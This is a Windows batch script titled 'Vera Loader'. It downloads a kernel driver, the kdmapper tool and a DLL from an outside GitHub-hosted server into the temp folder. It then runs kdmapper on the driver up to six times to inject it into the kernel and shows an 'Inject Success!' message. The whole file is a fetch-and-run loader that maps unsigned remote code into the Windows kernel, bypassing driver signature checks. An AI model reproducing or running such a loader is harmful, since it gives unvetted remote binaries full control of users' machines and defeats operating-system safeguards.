@echo off
cd %temp%
del driver.sys
curl -o driver.sys https://getserver.github.io/api/keysys/driver.sys
cls
curl -o kdmapper_Release.exe https://getserver.github.io/api/keysys/kdmapper_Release.exe
cls
curl -o test.dll https://raw.githubusercontent.com/getserver/getserver.github.io/main/api/keysys/test.dll
cls
echo Try Inject 1
"kdmapper_Release.exe" "driver.sys"
echo Try Inject 2
"kdmapper_Release.exe" "driver.sys"
echo Try Inject 3
"kdmapper_Release.exe" "driver.sys"
echo Try Inject 4
"kdmapper_Release.exe" "driver.sys"
echo Try Inject 5
"kdmapper_Release.exe" "driver.sys"
echo Try Inject 6
"kdmapper_Release.exe" "driver.sys"
echo ok



set VBScriptFile=temp.vbs

(
  echo MsgBox "Inject Success!", vbInformation, "Vera Loader"
) > %VBScriptFile%

cscript //nologo %VBScriptFile%
del %VBScriptFile%
exit

